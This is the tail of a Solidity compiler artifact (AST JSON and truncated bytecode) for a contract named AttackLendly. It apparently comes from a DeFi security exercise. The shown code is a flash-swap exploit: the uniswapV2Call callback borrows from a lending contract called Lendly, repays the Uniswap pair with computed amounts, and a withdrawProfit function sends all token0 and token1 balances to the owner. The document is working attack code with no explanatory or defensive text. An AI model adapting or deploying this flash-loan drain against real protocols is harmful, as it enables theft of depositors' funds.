                          "typeIdentifier": "t_address",
                          "typeString": "address"
                        },
                        {
                          "typeIdentifier": "t_uint256",
                          "typeString": "uint256"
                        }
                      ],
                      "expression": {
                        "id": 284,
                        "name": "lendly",
                        "nodeType": "Identifier",
                        "overloadedDeclarations": [],
                        "referencedDeclaration": 27,
                        "src": "2898:6:3",
                        "typeDescriptions": {
                          "typeIdentifier": "t_contract$_ILendly_$21",
                          "typeString": "contract ILendly"
                        }
                      },
                      "id": 286,
                      "isConstant": false,
                      "isLValue": false,
                      "isPure": false,
                      "lValueRequested": false,
                      "memberName": "borrow",
                      "nodeType": "MemberAccess",
                      "referencedDeclaration": 20,
                      "src": "2898:13:3",
                      "typeDescriptions": {
                        "typeIdentifier": "t_function_external_nonpayable$_t_address_$_t_uint256_$returns$__$",
                        "typeString": "function (address,uint256) external"
                      }
                    },
                    "id": 298,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": false,
                    "kind": "functionCall",
                    "lValueRequested": false,
                    "names": [],
                    "nodeType": "FunctionCall",
                    "src": "2898:73:3",
                    "tryCall": false,
                    "typeDescriptions": {
                      "typeIdentifier": "t_tuple$__$",
                      "typeString": "tuple()"
                    }
                  },
                  "id": 299,
                  "nodeType": "ExpressionStatement",
                  "src": "2898:73:3"
                },
                {
                  "assignments": [
                    301
                  ],
                  "declarations": [
                    {
                      "constant": false,
                      "id": 301,
                      "mutability": "mutable",
                      "name": "tokenPaymentAmount",
                      "nameLocation": "3021:18:3",
                      "nodeType": "VariableDeclaration",
                      "scope": 339,
                      "src": "3013:26:3",
                      "stateVariable": false,
                      "storageLocation": "default",
                      "typeDescriptions": {
                        "typeIdentifier": "t_uint256",
                        "typeString": "uint256"
                      },
                      "typeName": {
                        "id": 300,
                        "name": "uint256",
                        "nodeType": "ElementaryTypeName",
                        "src": "3013:7:3",
                        "typeDescriptions": {
                          "typeIdentifier": "t_uint256",
                          "typeString": "uint256"
                        }
                      },
                      "visibility": "internal"
                    }
                  ],
                  "id": 307,
                  "initialValue": {
                    "commonType": {
                      "typeIdentifier": "t_uint256",
                      "typeString": "uint256"
                    },
                    "id": 306,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": false,
                    "lValueRequested": false,
                    "leftExpression": {
                      "commonType": {
                        "typeIdentifier": "t_uint256",
                        "typeString": "uint256"
                      },
                      "id": 304,
                      "isConstant": false,
                      "isLValue": false,
                      "isPure": false,
                      "lValueRequested": false,
                      "leftExpression": {
                        "id": 302,
                        "name": "amount",
                        "nodeType": "Identifier",
                        "overloadedDeclarations": [],
                        "referencedDeclaration": 219,
                        "src": "3042:6:3",
                        "typeDescriptions": {
                          "typeIdentifier": "t_uint256",
                          "typeString": "uint256"
                        }
                      },
                      "nodeType": "BinaryOperation",
                      "operator": "*",
                      "rightExpression": {
                        "hexValue": "393939",
                        "id": 303,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": true,
                        "kind": "number",
                        "lValueRequested": false,
                        "nodeType": "Literal",
                        "src": "3051:3:3",
                        "typeDescriptions": {
                          "typeIdentifier": "t_rational_999_by_1",
                          "typeString": "int_const 999"
                        },
                        "value": "999"
                      },
                      "src": "3042:12:3",
                      "typeDescriptions": {
                        "typeIdentifier": "t_uint256",
                        "typeString": "uint256"
                      }
                    },
                    "nodeType": "BinaryOperation",
                    "operator": "/",
                    "rightExpression": {
                      "hexValue": "31303030",
                      "id": 305,
                      "isConstant": false,
                      "isLValue": false,
                      "isPure": true,
                      "kind": "number",
                      "lValueRequested": false,
                      "nodeType": "Literal",
                      "src": "3057:4:3",
                      "typeDescriptions": {
                        "typeIdentifier": "t_rational_1000_by_1",
                        "typeString": "int_const 1000"
                      },
                      "value": "1000"
                    },
                    "src": "3042:19:3",
                    "typeDescriptions": {
                      "typeIdentifier": "t_uint256",
                      "typeString": "uint256"
                    }
                  },
                  "nodeType": "VariableDeclarationStatement",
                  "src": "3013:48:3"
                },
                {
                  "assignments": [
                    309
                  ],
                  "declarations": [
                    {
                      "constant": false,
                      "id": 309,
                      "mutability": "mutable",
                      "name": "otherTokenPaymentAmount",
                      "nameLocation": "3154:23:3",
                      "nodeType": "VariableDeclaration",
                      "scope": 339,
                      "src": "3146:31:3",
                      "stateVariable": false,
                      "storageLocation": "default",
                      "typeDescriptions": {
                        "typeIdentifier": "t_uint256",
                        "typeString": "uint256"
                      },
                      "typeName": {
                        "id": 308,
                        "name": "uint256",
                        "nodeType": "ElementaryTypeName",
                        "src": "3146:7:3",
                        "typeDescriptions": {
                          "typeIdentifier": "t_uint256",
                          "typeString": "uint256"
                        }
                      },
                      "visibility": "internal"
                    }
                  ],
                  "id": 315,
                  "initialValue": {
                    "commonType": {
                      "typeIdentifier": "t_uint256",
                      "typeString": "uint256"
                    },
                    "id": 314,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": false,
                    "lValueRequested": false,
                    "leftExpression": {
                      "commonType": {
                        "typeIdentifier": "t_uint256",
                        "typeString": "uint256"
                      },
                      "id": 312,
                      "isConstant": false,
                      "isLValue": false,
                      "isPure": false,
                      "lValueRequested": false,
                      "leftExpression": {
                        "id": 310,
                        "name": "otherTokenReserve",
                        "nodeType": "Identifier",
                        "overloadedDeclarations": [],
                        "referencedDeclaration": 260,
                        "src": "3180:17:3",
                        "typeDescriptions": {
                          "typeIdentifier": "t_uint256",
                          "typeString": "uint256"
                        }
                      },
                      "nodeType": "BinaryOperation",
                      "operator": "*",
                      "rightExpression": {
                        "hexValue": "34",
                        "id": 311,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": true,
                        "kind": "number",
                        "lValueRequested": false,
                        "nodeType": "Literal",
                        "src": "3200:1:3",
                        "typeDescriptions": {
                          "typeIdentifier": "t_rational_4_by_1",
                          "typeString": "int_const 4"
                        },
                        "value": "4"
                      },
                      "src": "3180:21:3",
                      "typeDescriptions": {
                        "typeIdentifier": "t_uint256",
                        "typeString": "uint256"
                      }
                    },
                    "nodeType": "BinaryOperation",
                    "operator": "/",
                    "rightExpression": {
                      "hexValue": "31303030",
                      "id": 313,
                      "isConstant": false,
                      "isLValue": false,
                      "isPure": true,
                      "kind": "number",
                      "lValueRequested": false,
                      "nodeType": "Literal",
                      "src": "3204:4:3",
                      "typeDescriptions": {
                        "typeIdentifier": "t_rational_1000_by_1",
                        "typeString": "int_const 1000"
                      },
                      "value": "1000"
                    },
                    "src": "3180:28:3",
                    "typeDescriptions": {
                      "typeIdentifier": "t_uint256",
                      "typeString": "uint256"
                    }
                  },
                  "nodeType": "VariableDeclarationStatement",
                  "src": "3146:62:3"
                },
                {
                  "expression": {
                    "arguments": [
                      {
                        "arguments": [
                          {
                            "id": 321,
                            "name": "pair",
                            "nodeType": "Identifier",
                            "overloadedDeclarations": [],
                            "referencedDeclaration": 30,
                            "src": "3242:4:3",
                            "typeDescriptions": {
                              "typeIdentifier": "t_contract$_IUniswapV2Pair_$867",
                              "typeString": "contract IUniswapV2Pair"
                            }
                          }
                        ],
                        "expression": {
                          "argumentTypes": [
                            {
                              "typeIdentifier": "t_contract$_IUniswapV2Pair_$867",
                              "typeString": "contract IUniswapV2Pair"
                            }
                          ],
                          "id": 320,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": true,
                          "lValueRequested": false,
                          "nodeType": "ElementaryTypeNameExpression",
                          "src": "3234:7:3",
                          "typeDescriptions": {
                            "typeIdentifier": "t_type$_t_address_$",
                            "typeString": "type(address)"
                          },
                          "typeName": {
                            "id": 319,
                            "name": "address",
                            "nodeType": "ElementaryTypeName",
                            "src": "3234:7:3",
                            "typeDescriptions": {}
                          }
                        },
                        "id": 322,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": false,
                        "kind": "typeConversion",
                        "lValueRequested": false,
                        "names": [],
                        "nodeType": "FunctionCall",
                        "src": "3234:13:3",
                        "tryCall": false,
                        "typeDescriptions": {
                          "typeIdentifier": "t_address",
                          "typeString": "address"
                        }
                      },
                      {
                        "id": 323,
                        "name": "tokenPaymentAmount",
                        "nodeType": "Identifier",
                        "overloadedDeclarations": [],
                        "referencedDeclaration": 301,
                        "src": "3249:18:3",
                        "typeDescriptions": {
                          "typeIdentifier": "t_uint256",
                          "typeString": "uint256"
                        }
                      }
                    ],
                    "expression": {
                      "argumentTypes": [
                        {
                          "typeIdentifier": "t_address",
                          "typeString": "address"
                        },
                        {
                          "typeIdentifier": "t_uint256",
                          "typeString": "uint256"
                        }
                      ],
                      "expression": {
                        "id": 316,
                        "name": "token",
                        "nodeType": "Identifier",
                        "overloadedDeclarations": [],
                        "referencedDeclaration": 196,
                        "src": "3219:5:3",
                        "typeDescriptions": {
                          "typeIdentifier": "t_contract$_IERC20_$564",
                          "typeString": "contract IERC20"
                        }
                      },
                      "id": 318,
                      "isConstant": false,
                      "isLValue": false,
                      "isPure": false,
                      "lValueRequested": false,
                      "memberName": "transfer",
                      "nodeType": "MemberAccess",
                      "referencedDeclaration": 531,
                      "src": "3219:14:3",
                      "typeDescriptions": {
                        "typeIdentifier": "t_function_external_nonpayable$_t_address_$_t_uint256_$returns$_t_bool_$",
                        "typeString": "function (address,uint256) external returns (bool)"
                      }
                    },
                    "id": 324,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": false,
                    "kind": "functionCall",
                    "lValueRequested": false,
                    "names": [],
                    "nodeType": "FunctionCall",
                    "src": "3219:49:3",
                    "tryCall": false,
                    "typeDescriptions": {
                      "typeIdentifier": "t_bool",
                      "typeString": "bool"
                    }
                  },
                  "id": 325,
                  "nodeType": "ExpressionStatement",
                  "src": "3219:49:3"
                },
                {
                  "expression": {
                    "arguments": [
                      {
                        "arguments": [
                          {
                            "id": 331,
                            "name": "pair",
                            "nodeType": "Identifier",
                            "overloadedDeclarations": [],
                            "referencedDeclaration": 30,
                            "src": "3306:4:3",
                            "typeDescriptions": {
                              "typeIdentifier": "t_contract$_IUniswapV2Pair_$867",
                              "typeString": "contract IUniswapV2Pair"
                            }
                          }
                        ],
                        "expression": {
                          "argumentTypes": [
                            {
                              "typeIdentifier": "t_contract$_IUniswapV2Pair_$867",
                              "typeString": "contract IUniswapV2Pair"
                            }
                          ],
                          "id": 330,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": true,
                          "lValueRequested": false,
                          "nodeType": "ElementaryTypeNameExpression",
                          "src": "3298:7:3",
                          "typeDescriptions": {
                            "typeIdentifier": "t_type$_t_address_$",
                            "typeString": "type(address)"
                          },
                          "typeName": {
                            "id": 329,
                            "name": "address",
                            "nodeType": "ElementaryTypeName",
                            "src": "3298:7:3",
                            "typeDescriptions": {}
                          }
                        },
                        "id": 332,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": false,
                        "kind": "typeConversion",
                        "lValueRequested": false,
                        "names": [],
                        "nodeType": "FunctionCall",
                        "src": "3298:13:3",
                        "tryCall": false,
                        "typeDescriptions": {
                          "typeIdentifier": "t_address",
                          "typeString": "address"
                        }
                      },
                      {
                        "id": 333,
                        "name": "otherTokenPaymentAmount",
                        "nodeType": "Identifier",
                        "overloadedDeclarations": [],
                        "referencedDeclaration": 309,
                        "src": "3313:23:3",
                        "typeDescriptions": {
                          "typeIdentifier": "t_uint256",
                          "typeString": "uint256"
                        }
                      }
                    ],
                    "expression": {
                      "argumentTypes": [
                        {
                          "typeIdentifier": "t_address",
                          "typeString": "address"
                        },
                        {
                          "typeIdentifier": "t_uint256",
                          "typeString": "uint256"
                        }
                      ],
                      "expression": {
                        "id": 326,
                        "name": "otherToken",
                        "nodeType": "Identifier",
                        "overloadedDeclarations": [],
                        "referencedDeclaration": 257,
                        "src": "3278:10:3",
                        "typeDescriptions": {
                          "typeIdentifier": "t_contract$_IERC20_$564",
                          "typeString": "contract IERC20"
                        }
                      },
                      "id": 328,
                      "isConstant": false,
                      "isLValue": false,
                      "isPure": false,
                      "lValueRequested": false,
                      "memberName": "transfer",
                      "nodeType": "MemberAccess",
                      "referencedDeclaration": 531,
                      "src": "3278:19:3",
                      "typeDescriptions": {
                        "typeIdentifier": "t_function_external_nonpayable$_t_address_$_t_uint256_$returns$_t_bool_$",
                        "typeString": "function (address,uint256) external returns (bool)"
                      }
                    },
                    "id": 334,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": false,
                    "kind": "functionCall",
                    "lValueRequested": false,
                    "names": [],
                    "nodeType": "FunctionCall",
                    "src": "3278:59:3",
                    "tryCall": false,
                    "typeDescriptions": {
                      "typeIdentifier": "t_bool",
                      "typeString": "bool"
                    }
                  },
                  "id": 335,
                  "nodeType": "ExpressionStatement",
                  "src": "3278:59:3"
                },
                {
                  "expression": {
                    "arguments": [],
                    "expression": {
                      "argumentTypes": [],
                      "id": 336,
                      "name": "withdrawProfit",
                      "nodeType": "Identifier",
                      "overloadedDeclarations": [],
                      "referencedDeclaration": 372,
                      "src": "3356:14:3",
                      "typeDescriptions": {
                        "typeIdentifier": "t_function_internal_nonpayable$__$returns$__$",
                        "typeString": "function ()"
                      }
                    },
                    "id": 337,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": false,
                    "kind": "functionCall",
                    "lValueRequested": false,
                    "names": [],
                    "nodeType": "FunctionCall",
                    "src": "3356:16:3",
                    "tryCall": false,
                    "typeDescriptions": {
                      "typeIdentifier": "t_tuple$__$",
                      "typeString": "tuple()"
                    }
                  },
                  "id": 338,
                  "nodeType": "ExpressionStatement",
                  "src": "3356:16:3"
                }
              ]
            },
            "functionSelector": "10d1e85c",
            "id": 340,
            "implemented": true,
            "kind": "function",
            "modifiers": [],
            "name": "uniswapV2Call",
            "nameLocation": "1789:13:3",
            "nodeType": "FunctionDefinition",
            "parameters": {
              "id": 171,
              "nodeType": "ParameterList",
              "parameters": [
                {
                  "constant": false,
                  "id": 164,
                  "mutability": "mutable",
                  "name": "sender",
                  "nameLocation": "1820:6:3",
                  "nodeType": "VariableDeclaration",
                  "scope": 340,
                  "src": "1812:14:3",
                  "stateVariable": false,
                  "storageLocation": "default",
                  "typeDescriptions": {
                    "typeIdentifier": "t_address",
                    "typeString": "address"
                  },
                  "typeName": {
                    "id": 163,
                    "name": "address",
                    "nodeType": "ElementaryTypeName",
                    "src": "1812:7:3",
                    "stateMutability": "nonpayable",
                    "typeDescriptions": {
                      "typeIdentifier": "t_address",
                      "typeString": "address"
                    }
                  },
                  "visibility": "internal"
                },
                {
                  "constant": false,
                  "id": 166,
                  "mutability": "mutable",
                  "name": "amount0",
                  "nameLocation": "1841:7:3",
                  "nodeType": "VariableDeclaration",
                  "scope": 340,
                  "src": "1836:12:3",
                  "stateVariable": false,
                  "storageLocation": "default",
                  "typeDescriptions": {
                    "typeIdentifier": "t_uint256",
                    "typeString": "uint256"
                  },
                  "typeName": {
                    "id": 165,
                    "name": "uint",
                    "nodeType": "ElementaryTypeName",
                    "src": "1836:4:3",
                    "typeDescriptions": {
                      "typeIdentifier": "t_uint256",
                      "typeString": "uint256"
                    }
                  },
                  "visibility": "internal"
                },
                {
                  "constant": false,
                  "id": 168,
                  "mutability": "mutable",
                  "name": "amount1",
                  "nameLocation": "1863:7:3",
                  "nodeType": "VariableDeclaration",
                  "scope": 340,
                  "src": "1858:12:3",
                  "stateVariable": false,
                  "storageLocation": "default",
                  "typeDescriptions": {
                    "typeIdentifier": "t_uint256",
                    "typeString": "uint256"
                  },
                  "typeName": {
                    "id": 167,
                    "name": "uint",
                    "nodeType": "ElementaryTypeName",
                    "src": "1858:4:3",
                    "typeDescriptions": {
                      "typeIdentifier": "t_uint256",
                      "typeString": "uint256"
                    }
                  },
                  "visibility": "internal"
                },
                {
                  "constant": false,
                  "id": 170,
                  "mutability": "mutable",
                  "name": "data",
                  "nameLocation": "1895:4:3",
                  "nodeType": "VariableDeclaration",
                  "scope": 340,
                  "src": "1880:19:3",
                  "stateVariable": false,
                  "storageLocation": "calldata",
                  "typeDescriptions": {
                    "typeIdentifier": "t_bytes_calldata_ptr",
                    "typeString": "bytes"
                  },
                  "typeName": {
                    "id": 169,
                    "name": "bytes",
                    "nodeType": "ElementaryTypeName",
                    "src": "1880:5:3",
                    "typeDescriptions": {
                      "typeIdentifier": "t_bytes_storage_ptr",
                      "typeString": "bytes"
                    }
                  },
                  "visibility": "internal"
                }
              ],
              "src": "1802:103:3"
            },
            "returnParameters": {
              "id": 172,
              "nodeType": "ParameterList",
              "parameters": [],
              "src": "1915:0:3"
            },
            "scope": 373,
            "src": "1780:1599:3",
            "stateMutability": "nonpayable",
            "virtual": false,
            "visibility": "external"
          },
          {
            "body": {
              "id": 371,
              "nodeType": "Block",
              "src": "3420:141:3",
              "statements": [
                {
                  "expression": {
                    "arguments": [
                      {
                        "arguments": [],
                        "expression": {
                          "argumentTypes": [],
                          "id": 346,
                          "name": "owner",
                          "nodeType": "Identifier",
                          "overloadedDeclarations": [],
                          "referencedDeclaration": 414,
                          "src": "3446:5:3",
                          "typeDescriptions": {
                            "typeIdentifier": "t_function_internal_view$__$returns$_t_address_$",
                            "typeString": "function () view returns (address)"
                          }
                        },
                        "id": 347,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": false,
                        "kind": "functionCall",
                        "lValueRequested": false,
                        "names": [],
                        "nodeType": "FunctionCall",
                        "src": "3446:7:3",
                        "tryCall": false,
                        "typeDescriptions": {
                          "typeIdentifier": "t_address",
                          "typeString": "address"
                        }
                      },
                      {
                        "arguments": [
                          {
                            "arguments": [
                              {
                                "id": 352,
                                "name": "this",
                                "nodeType": "Identifier",
                                "overloadedDeclarations": [],
                                "referencedDeclaration": -28,
                                "src": "3480:4:3",
                                "typeDescriptions": {
                                  "typeIdentifier": "t_contract$_AttackLendly_$373",
                                  "typeString": "contract AttackLendly"
                                }
                              }
                            ],
                            "expression": {
                              "argumentTypes": [
                                {
                                  "typeIdentifier": "t_contract$_AttackLendly_$373",
                                  "typeString": "contract AttackLendly"
                                }
                              ],
                              "id": 351,
                              "isConstant": false,
                              "isLValue": false,
                              "isPure": true,
                              "lValueRequested": false,
                              "nodeType": "ElementaryTypeNameExpression",
                              "src": "3472:7:3",
                              "typeDescriptions": {
                                "typeIdentifier": "t_type$_t_address_$",
                                "typeString": "type(address)"
                              },
                              "typeName": {
                                "id": 350,
                                "name": "address",
                                "nodeType": "ElementaryTypeName",
                                "src": "3472:7:3",
                                "typeDescriptions": {}
                              }
                            },
                            "id": 353,
                            "isConstant": false,
                            "isLValue": false,
                            "isPure": false,
                            "kind": "typeConversion",
                            "lValueRequested": false,
                            "names": [],
                            "nodeType": "FunctionCall",
                            "src": "3472:13:3",
                            "tryCall": false,
                            "typeDescriptions": {
                              "typeIdentifier": "t_address",
                              "typeString": "address"
                            }
                          }
                        ],
                        "expression": {
                          "argumentTypes": [
                            {
                              "typeIdentifier": "t_address",
                              "typeString": "address"
                            }
                          ],
                          "expression": {
                            "id": 348,
                            "name": "token0",
                            "nodeType": "Identifier",
                            "overloadedDeclarations": [],
                            "referencedDeclaration": 33,
                            "src": "3455:6:3",
                            "typeDescriptions": {
                              "typeIdentifier": "t_contract$_IERC20_$564",
                              "typeString": "contract IERC20"
                            }
                          },
                          "id": 349,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": false,
                          "lValueRequested": false,
                          "memberName": "balanceOf",
                          "nodeType": "MemberAccess",
                          "referencedDeclaration": 521,
                          "src": "3455:16:3",
                          "typeDescriptions": {
                            "typeIdentifier": "t_function_external_view$_t_address_$returns$_t_uint256_$",
                            "typeString": "function (address) view external returns (uint256)"
                          }
                        },
                        "id": 354,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": false,
                        "kind": "functionCall",
                        "lValueRequested": false,
                        "names": [],
                        "nodeType": "FunctionCall",
                        "src": "3455:31:3",
                        "tryCall": false,
                        "typeDescriptions": {
                          "typeIdentifier": "t_uint256",
                          "typeString": "uint256"
                        }
                      }
                    ],
                    "expression": {
                      "argumentTypes": [
                        {
                          "typeIdentifier": "t_address",
                          "typeString": "address"
                        },
                        {
                          "typeIdentifier": "t_uint256",
                          "typeString": "uint256"
                        }
                      ],
                      "expression": {
                        "id": 343,
                        "name": "token0",
                        "nodeType": "Identifier",
                        "overloadedDeclarations": [],
                        "referencedDeclaration": 33,
                        "src": "3430:6:3",
                        "typeDescriptions": {
                          "typeIdentifier": "t_contract$_IERC20_$564",
                          "typeString": "contract IERC20"
                        }
                      },
                      "id": 345,
                      "isConstant": false,
                      "isLValue": false,
                      "isPure": false,
                      "lValueRequested": false,
                      "memberName": "transfer",
                      "nodeType": "MemberAccess",
                      "referencedDeclaration": 531,
                      "src": "3430:15:3",
                      "typeDescriptions": {
                        "typeIdentifier": "t_function_external_nonpayable$_t_address_$_t_uint256_$returns$_t_bool_$",
                        "typeString": "function (address,uint256) external returns (bool)"
                      }
                    },
                    "id": 355,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": false,
                    "kind": "functionCall",
                    "lValueRequested": false,
                    "names": [],
                    "nodeType": "FunctionCall",
                    "src": "3430:57:3",
                    "tryCall": false,
                    "typeDescriptions": {
                      "typeIdentifier": "t_bool",
                      "typeString": "bool"
                    }
                  },
                  "id": 356,
                  "nodeType": "ExpressionStatement",
                  "src": "3430:57:3"
                },
                {
                  "expression": {
                    "arguments": [
                      {
                        "arguments": [],
                        "expression": {
                          "argumentTypes": [],
                          "id": 360,
                          "name": "owner",
                          "nodeType": "Identifier",
                          "overloadedDeclarations": [],
                          "referencedDeclaration": 414,
                          "src": "3513:5:3",
                          "typeDescriptions": {
                            "typeIdentifier": "t_function_internal_view$__$returns$_t_address_$",
                            "typeString": "function () view returns (address)"
                          }
                        },
                        "id": 361,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": false,
                        "kind": "functionCall",
                        "lValueRequested": false,
                        "names": [],
                        "nodeType": "FunctionCall",
                        "src": "3513:7:3",
                        "tryCall": false,
                        "typeDescriptions": {
                          "typeIdentifier": "t_address",
                          "typeString": "address"
                        }
                      },
                      {
                        "arguments": [
                          {
                            "arguments": [
                              {
                                "id": 366,
                                "name": "this",
                                "nodeType": "Identifier",
                                "overloadedDeclarations": [],
                                "referencedDeclaration": -28,
                                "src": "3547:4:3",
                                "typeDescriptions": {
                                  "typeIdentifier": "t_contract$_AttackLendly_$373",
                                  "typeString": "contract AttackLendly"
                                }
                              }
                            ],
                            "expression": {
                              "argumentTypes": [
                                {
                                  "typeIdentifier": "t_contract$_AttackLendly_$373",
                                  "typeString": "contract AttackLendly"
                                }
                              ],
                              "id": 365,
                              "isConstant": false,
                              "isLValue": false,
                              "isPure": true,
                              "lValueRequested": false,
                              "nodeType": "ElementaryTypeNameExpression",
                              "src": "3539:7:3",
                              "typeDescriptions": {
                                "typeIdentifier": "t_type$_t_address_$",
                                "typeString": "type(address)"
                              },
                              "typeName": {
                                "id": 364,
                                "name": "address",
                                "nodeType": "ElementaryTypeName",
                                "src": "3539:7:3",
                                "typeDescriptions": {}
                              }
                            },
                            "id": 367,
                            "isConstant": false,
                            "isLValue": false,
                            "isPure": false,
                            "kind": "typeConversion",
                            "lValueRequested": false,
                            "names": [],
                            "nodeType": "FunctionCall",
                            "src": "3539:13:3",
                            "tryCall": false,
                            "typeDescriptions": {
                              "typeIdentifier": "t_address",
                              "typeString": "address"
                            }
                          }
                        ],
                        "expression": {
                          "argumentTypes": [
                            {
                              "typeIdentifier": "t_address",
                              "typeString": "address"
                            }
                          ],
                          "expression": {
                            "id": 362,
                            "name": "token1",
                            "nodeType": "Identifier",
                            "overloadedDeclarations": [],
                            "referencedDeclaration": 36,
                            "src": "3522:6:3",
                            "typeDescriptions": {
                              "typeIdentifier": "t_contract$_IERC20_$564",
                              "typeString": "contract IERC20"
                            }
                          },
                          "id": 363,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": false,
                          "lValueRequested": false,
                          "memberName": "balanceOf",
                          "nodeType": "MemberAccess",
                          "referencedDeclaration": 521,
                          "src": "3522:16:3",
                          "typeDescriptions": {
                            "typeIdentifier": "t_function_external_view$_t_address_$returns$_t_uint256_$",
                            "typeString": "function (address) view external returns (uint256)"
                          }
                        },
                        "id": 368,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": false,
                        "kind": "functionCall",
                        "lValueRequested": false,
                        "names": [],
                        "nodeType": "FunctionCall",
                        "src": "3522:31:3",
                        "tryCall": false,
                        "typeDescriptions": {
                          "typeIdentifier": "t_uint256",
                          "typeString": "uint256"
                        }
                      }
                    ],
                    "expression": {
                      "argumentTypes": [
                        {
                          "typeIdentifier": "t_address",
                          "typeString": "address"
                        },
                        {
                          "typeIdentifier": "t_uint256",
                          "typeString": "uint256"
                        }
                      ],
                      "expression": {
                        "id": 357,
                        "name": "token1",
                        "nodeType": "Identifier",
                        "overloadedDeclarations": [],
                        "referencedDeclaration": 36,
                        "src": "3497:6:3",
                        "typeDescriptions": {
                          "typeIdentifier": "t_contract$_IERC20_$564",
                          "typeString": "contract IERC20"
                        }
                      },
                      "id": 359,
                      "isConstant": false,
                      "isLValue": false,
                      "isPure": false,
                      "lValueRequested": false,
                      "memberName": "transfer",
                      "nodeType": "MemberAccess",
                      "referencedDeclaration": 531,
                      "src": "3497:15:3",
                      "typeDescriptions": {
                        "typeIdentifier": "t_function_external_nonpayable$_t_address_$_t_uint256_$returns$_t_bool_$",
                        "typeString": "function (address,uint256) external returns (bool)"
                      }
                    },
                    "id": 369,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": false,
                    "kind": "functionCall",
                    "lValueRequested": false,
                    "names": [],
                    "nodeType": "FunctionCall",
                    "src": "3497:57:3",
                    "tryCall": false,
                    "typeDescriptions": {
                      "typeIdentifier": "t_bool",
                      "typeString": "bool"
                    }
                  },
                  "id": 370,
                  "nodeType": "ExpressionStatement",
                  "src": "3497:57:3"
                }
              ]
            },
            "id": 372,
            "implemented": true,
            "kind": "function",
            "modifiers": [],
            "name": "withdrawProfit",
            "nameLocation": "3394:14:3",
            "nodeType": "FunctionDefinition",
            "parameters": {
              "id": 341,
              "nodeType": "ParameterList",
              "parameters": [],
              "src": "3408:2:3"
            },
            "returnParameters": {
              "id": 342,
              "nodeType": "ParameterList",
              "parameters": [],
              "src": "3420:0:3"
            },
            "scope": 373,
            "src": "3385:176:3",
            "stateMutability": "nonpayable",
            "virtual": false,
            "visibility": "internal"
          }
        ],
        "scope": 374,
        "src": "569:2995:3",
        "usedErrors": []
      }
    ],
    "src": "116:3448:3"
  },
  "bytecode": "6101006040523480156200001257600080fd5b5060405162001255380380620012558339810160408190526200003591620001ba565b62000040336200014d565b6001600160a01b0380831660a081905290821660805260408051630dfe168160e01b81529051630dfe1681916004808201926020929091908290030181865afa15801562000092573d6000803e3d6000fd5b505050506040513d601f19601f82011682018060405250810190620000b89190620001f2565b6001600160a01b031660c0816001600160a01b03168152505060a0516001600160a01b031663d21220a76040518163ffffffff1660e01b8152600401602060405180830381865afa15801562000112573d6000803e3d6000fd5b505050506040513d601f19601f82011682018060405250810190620001389190620001f2565b6001600160a01b031660e05250620002179050565b600080546001600160a01b038381166001600160a01b0319831681178455604051919092169283917f8be0079c531659141344cd1fd0a4f28419497f9722a3daafe3b4186f6b6457e09190a35050565b80516001600160a01b0381168114620001b557600080fd5b919050565b60008060408385031215620001ce57600080fd5b620001d9836200019d565b9150620001e9602084016200019d565b90509250929050565b6000602082840312156200020557600080fd5b62000210826200019d565b9392505050565b60805160a05160c05160e051610f8e620002c7600039600081816101ad015281816103a4015281816108b901528181610b2f0152610b8301526000818161017201528181610366015281816103d00152818161073d015281816109f60152610a4a01526000818160be01528181610535015281816105cd015281816106820152818161078d015281816107fd015261090901526000818161025e0152818161030501526104080152610f8e6000f3fe608060405234801561001057600080fd5b50600436106100575760003560e01c806310d1e85c1461005c578063715018a6146100715780638da5cb5b146100795780639e5faafc14610098578063f2fde38b146100a0575b600080fd5b61006f61006a366004610d24565b6100b3565b005b61006f610660565b600054604080516001600160a01b039092168252519081900360200190f35b61006f610674565b61006f6100ae366004610dba565b61097b565b336001600160a01b037f0000000000000000000000000000000000000000000000000000000000000000161461011b5760405162461bcd60e51b81526020600482015260086024820152673737ba103830b4b960c11b60448201526064015b60405180910390fd5b6001600160a01b03851630146101605760405162461bcd60e51b815260206004820152600a6024820152693737ba1039b2b73232b960b11b6044820152606401610112565b600061016e82840184610dba565b90507f00000000000000000000000000000000000000000000000000000000000000006001600160a01b0316816001600160a01b031614806101e157507f00000000000000000000000000000000000000000000000000000000000000006001600160a01b0316816001600160a01b0316145b61021b5760405162461bcd60e51b815260206004820152600b60248201526a3bb937b733903a37b5b2b760a91b6044820152606401610112565b60008515610229578561022b565b845b905060006103e861023d836001610dde565b6102479190610e0b565b60405163095ea7b360e01b81526001600160a01b037f000000000000000000000000000000000000000000000000000000000000000081166004830152602482018390529192509084169063095ea7b3906044016020604051808303816000875af11580156102ba573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906102de9190610e2d565b506040516311f9fbc960e21b81526001600160a01b038481166004830152602482018390527f000000000000000000000000000000000000000000000000000000000000000016906347e7ef2490604401600060405180830381600087803b15801561034957600080fd5b505af115801561035d573d6000803e3d6000fd5b505050506000807f00000000000000000000000000000000000000000000000000000000000000006001600160a01b0316856001600160a01b0316036103c95750506002547f0000000000000000000000000000000000000000000000000000000000000000906103f1565b50506001547f0000000000000000000000000000000000000000000000000000000000000000905b6040516370a0823160e01b81526001600160a01b037f000000000000000000000000000000000000000000000000000000000000000081166004830181905291634b8a3529918591908216906370a0823190602401602060405180830381865afa158015610463573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906104879190610e4f565b6040516001600160e01b031960e085901b1681526001600160a01b0390921660048301526024820152604401600060405180830381600087803b1580156104cd57600080fd5b505af11580156104e1573d6000803e3d6000fd5b5050505060006103e8856103e76104f89190610dde565b6105029190610e0b565b90